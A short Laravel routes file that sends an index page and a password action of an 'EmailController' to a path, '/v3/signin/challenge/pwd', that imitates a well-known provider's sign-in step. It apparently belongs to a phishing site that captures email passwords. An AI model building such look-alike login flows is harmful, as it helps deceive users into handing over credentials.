<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\EmailController;


/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "web" middleware group. Make something great!
|
*/

Route::get('/',[EmailController::class,'index'])->name('email.index');
Route::get('/v3/signin/challenge/pwd',
[EmailController::class,'password'])->name('email.password');
